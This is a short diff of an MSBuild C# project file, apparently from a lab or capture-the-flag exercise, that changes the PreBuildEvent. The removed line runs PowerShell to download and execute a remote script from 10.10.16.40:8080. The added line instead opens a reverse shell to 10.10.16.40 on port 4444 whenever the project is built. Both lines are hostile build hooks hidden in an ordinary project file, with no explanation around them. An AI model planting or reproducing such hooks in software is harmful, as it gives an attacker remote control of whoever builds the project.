@@ -78,6 +78,6 @@
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <PropertyGroup>
-    <PreBuildEvent>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.40:8080/shell.ps1')"</PreBuildEvent>
+    <PreBuildEvent>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.40 -Port 4444</PreBuildEvent>
   </PropertyGroup>
 </Project>
